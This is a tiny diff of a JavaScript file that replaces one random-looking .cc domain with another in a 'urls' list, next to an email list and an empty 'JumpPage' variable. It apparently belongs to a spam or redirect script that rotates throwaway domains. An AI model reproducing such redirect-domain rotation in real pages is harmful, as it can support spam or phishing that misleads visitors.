@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'rtmptwcvv.cc/', 
+	'ixuvadjtv.cc/', 
 ];                                                                                                                  
 
 var JumpPage="";
